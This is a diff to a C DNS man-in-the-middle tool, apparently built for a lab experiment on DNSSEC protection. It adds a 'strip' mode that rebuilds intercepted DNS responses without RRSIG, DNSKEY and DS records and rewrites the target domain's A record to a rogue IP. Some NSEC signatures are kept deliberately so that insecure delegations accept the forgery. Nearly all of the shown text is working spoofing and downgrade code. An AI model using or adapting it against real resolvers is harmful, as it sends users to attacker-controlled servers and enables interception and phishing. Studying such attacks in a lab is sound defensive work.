@@ -128,16 +128,159 @@ static const uint8_t *dns_skip_name(const uint8_t *end, const uint8_t *p)
 /* DNS header (RFC 1035) */
 struct dnshdr { uint16_t id, flags, qd, an, ns, ar; };
 
+/* Copy a (possibly compressed) name from the source as an UNCOMPRESSED wire name
+ * into out, advance *p past the name in the source, return bytes written. We
+ * expand names so the rebuilt message below carries no pointers into bytes we
+ * removed. */
+static int name_copy_expanded(const uint8_t *base, const uint8_t *end,
+                              const uint8_t **p, uint8_t *out)
+{
+    const uint8_t *q = *p, *after = NULL;
+    int jumped = 0, o = 0, done = 0;
+    while (q < end) {
+        uint8_t len = *q;
+        if ((len & 0xc0) == 0xc0) {
+            if (q + 1 >= end) break;
+            if (!jumped) after = q + 2;
+            q = base + (((len & 0x3f) << 8) | q[1]); jumped = 1;
+            if (q >= end) break;
+            continue;
+        }
+        if (len == 0) { out[o++] = 0; q++; done = 1; break; }
+        if (len > 63 || q + 1 + len > end) break;
+        out[o++] = len; memcpy(out + o, q + 1, len); o += len; q += 1 + len;
+    }
+    if (!done) out[o++] = 0;                 /* always terminate the name */
+    *p = jumped ? after : q;
+    return o;
+}
+
+/* wire-format name -> lowercased dotted string, for comparing against g_target */
+static void wire_to_dotted(const uint8_t *name, char *out, size_t outsz)
+{
+    size_t o = 0; const uint8_t *q = name;
+    while (*q) {
+        uint8_t len = *q++;
+        for (int i = 0; i < len; i++) {
+            char c = (char)q[i]; if (c >= 'A' && c <= 'Z') c += 32;
+            if (o + 1 < outsz) out[o++] = c;
+        }
+        q += len;
+        if (o + 1 < outsz) out[o++] = '.';
+    }
+    if (o > 0 && out[o - 1] == '.') o--;
+    out[o] = '\0';
+}
+
+static uint8_t g_sbuf[65536];
+
+/* Decide whether strip should rewrite this message at all. We only act when
+ * there is something to strip or forge: a DS record (the com referral or a DS
+ * answer) or the target apex's A. We leave everything else untouched, in
+ * particular a "no DS" NODATA proof, whose NSEC+RRSIG we must not disturb or an
+ * insecure delegation (Run B) would stop validating. */
+static int strip_should_act(const uint8_t *dns, int dlen)
+{
+    const uint8_t *base = dns, *end = dns + dlen, *p = dns + sizeof(struct dnshdr);
+    const struct dnshdr *h = (const struct dnshdr *)dns;
+    int qd = ntohs(h->qd);
+    int tot = ntohs(h->an) + ntohs(h->ns) + ntohs(h->ar);
+    for (int i = 0; i < qd; i++) { p = dns_skip_name(end, p); if (p + 4 > end) return 0; p += 4; }
+    for (int i = 0; i < tot; i++) {
+        char owner[256];
+        if (dns_read_name(base, end, &p, owner, sizeof owner) < 0) return 0;
+        if (p + 10 > end) return 0;
+        uint16_t type = ntohs(*(const uint16_t *)p);
+        uint16_t rdlen = ntohs(*(const uint16_t *)(p + 8));
+        if (p + 10 + rdlen > end) return 0;
+        if (type == 43) return 1;                              /* a DS: strip it */
+        if (type == 1 && strcasecmp(owner, g_target) == 0) return 1;  /* target A */
+        p = p + 10 + rdlen;
+    }
+    return 0;
+}
+
+/* strip_rebuild(): copy the message into g_sbuf dropping every DNSSEC record
+ * (RRSIG=46, DNSKEY=48, DS=43) from all sections, and rewriting the target A to
+ * the rogue IP. This removes the signatures from the example.com answer AND the
+ * DS (and its RRSIG) from the com referral, the fuller downgrade. Returns the new
+ * length. Names are expanded so dropping records never breaks a compression
+ * pointer. */
+static int strip_rebuild(const uint8_t *dns, int dlen)
+{
+    if (dlen < (int)sizeof(struct dnshdr)) return dlen;
+    const uint8_t *base = dns, *end = dns + dlen, *p = dns + sizeof(struct dnshdr);
+    uint8_t *out = g_sbuf, *o = out + sizeof(struct dnshdr);
+    memcpy(out, dns, sizeof(struct dnshdr));
+    const struct dnshdr *ih = (const struct dnshdr *)dns;
+    int counts_in[3] = { ntohs(ih->an), ntohs(ih->ns), ntohs(ih->ar) };
+    int counts_out[3] = { 0, 0, 0 };
+    int qd = ntohs(ih->qd);
+
+    for (int i = 0; i < qd; i++) {                 /* questions: copy verbatim */
+        o += name_copy_expanded(base, end, &p, o);
+        if (p + 4 > end) return dlen;
+        memcpy(o, p, 4); o += 4; p += 4;
+    }
+
+    for (int s = 0; s < 3; s++) {
+        for (int i = 0; i < counts_in[s]; i++) {
+            uint8_t namebuf[256]; const uint8_t *pp = p;
+            int nl = name_copy_expanded(base, end, &pp, namebuf);
+            if (pp + 10 > end) { p = end; break; }
+            uint16_t type  = ntohs(*(const uint16_t *)pp);
+            const uint8_t *clsttl = pp + 2;          /* class(2) + ttl(4) */
+            uint16_t rdlen = ntohs(*(const uint16_t *)(pp + 8));
+            const uint8_t *rdata = pp + 10;
+            if (rdata + rdlen > end) { p = end; break; }
+            p = rdata + rdlen;                        /* advance source */
+
+            if (type == 48 || type == 43) continue;          /* drop DNSKEY, DS */
+            if (type == 46) {
+                /* RRSIG: drop only the ones that protect the records we are
+                 * forging or removing (A, DS, DNSKEY). Keep the RRSIG over an
+                 * NSEC/SOA, so a genuine "no DS" proof still validates: that is
+                 * what makes an already-insecure delegation (Run B) accept the
+                 * forged A, while a secure one (Run A) breaks and SERVFAILs. */
+                uint16_t covered = (rdlen >= 2) ? ntohs(*(const uint16_t *)rdata) : 0;
+                if (covered == 1 || covered == 43 || covered == 48) continue;
+            }
+
+            memcpy(o, namebuf, nl); o += nl;          /* owner */
+            *(uint16_t *)o = htons(type); o += 2;     /* type */
+            memcpy(o, clsttl, 6); o += 6;             /* class + ttl */
+            uint8_t *rdlenpos = o; o += 2;            /* rdlen placeholder */
+            uint8_t *rdstart = o;
+            if (type == 1 && rdlen == 4) {            /* A: forge only the apex */
+                char owner[256]; wire_to_dotted(namebuf, owner, sizeof owner);
+                if (strcasecmp(owner, g_target) == 0) memcpy(o, &g_rogue_ip, 4);
+                else memcpy(o, rdata, 4);
+                o += 4;
+            } else if (type == 2 || type == 5 || type == 12) {      /* NS/CNAME/PTR */
+                const uint8_t *rp = rdata; o += name_copy_expanded(base, end, &rp, o);
+            } else {
+                memcpy(o, rdata, rdlen); o += rdlen;  /* copy rdata verbatim */
+            }
+            *(uint16_t *)rdlenpos = htons((uint16_t)(o - rdstart));
+            counts_out[s]++;
+        }
+    }
+    struct dnshdr *oh = (struct dnshdr *)out;
+    oh->an = htons(counts_out[0]);
+    oh->ns = htons(counts_out[1]);
+    oh->ar = htons(counts_out[2]);
+    return (int)(o - out);
+}
+
 /*
  * handle_dns(): inspect/modify the DNS payload in place.
  * Returns the new payload length to forward, which may be shorter than dlen
- * (strip mode truncates the message), or dlen unchanged for relay/forge.
+ * (strip mode rebuilds a smaller message), or dlen unchanged for relay/forge.
  *
  *   forge : rewrite the A rdata of the exact target name to the rogue IP.
- *   strip : rewrite that A and then cut the message off right after it, so the
- *           RRSIG and every other DNSSEC record is gone. The resolver is handed
- *           a bare, unsigned-looking A. Whether that works depends on the parent:
- *           if com publishes a DS for the zone the resolver still demands a
+ *   strip : rebuild the message with every DNSSEC record removed and the target A
+ *           forged, so the answer looks unsigned. Whether that works depends on
+ *           the parent: if com publishes a DS the resolver still demands a
  *           signature and returns SERVFAIL (Phase 4 Run A); if com publishes no
  *           DS the delegation is insecure and the forged A is accepted (Run B).
  */
@@ -159,11 +302,25 @@ static int handle_dns(uint8_t *dns, int dlen)
     uint16_t qtype = ntohs(*(uint16_t *)p);
     p += 4;                                          /* qtype + qclass */
 
-    /* Only hijack the EXACT target name, type A. www.<target> is left alone. */
-    if (qtype != 1 || strcasecmp(qname, g_target) != 0)
-        return dlen;
+    int is_target = (strcasecmp(qname, g_target) == 0);
 
-    if (!g_forge && !g_strip) return dlen;           /* relay mode: untouched */
+    /* strip: act on the target's A answer AND its DS/referral from com, so we
+     * remove both the example.com signatures and the com->example.com DS. */
+    if (g_strip) {
+        if (!is_target || (qtype != 1 && qtype != 43)) return dlen;  /* A or DS */
+        if (!strip_should_act(dns, dlen)) return dlen;   /* nothing to strip here */
+        int n = strip_rebuild(dns, dlen);
+        if (n > 0 && n <= (int)sizeof g_sbuf) {
+            memcpy(dns, g_sbuf, n);
+            g_forged++;
+            return n;
+        }
+        return dlen;
+    }
+
+    /* forge/relay only touch the EXACT target name, type A. www is left alone. */
+    if (qtype != 1 || !is_target) return dlen;
+    if (!g_forge) return dlen;                       /* relay mode: untouched */
 
     /* skip remaining questions (we built for qd==1 but be safe) */
     for (int i = 1; i < qd; i++) {
@@ -184,15 +341,6 @@ static int handle_dns(uint8_t *dns, int dlen)
         if (type == 1 && rdlen == 4) {               /* A record */
             memcpy(rdata, &g_rogue_ip, 4);           /* -> rogue-web */
             changed = 1;
-            if (g_strip) {
-                /* downgrade: keep header + question + this one forged A, drop
-                 * everything after it (RRSIG, DNSKEY, OPT, authority glue). */
-                h->an = htons(1);
-                h->ns = 0;
-                h->ar = 0;
-                if (changed) g_forged++;
-                return (int)((rdata + 4) - dns);
-            }
         }
         p = rdata + rdlen;
     }
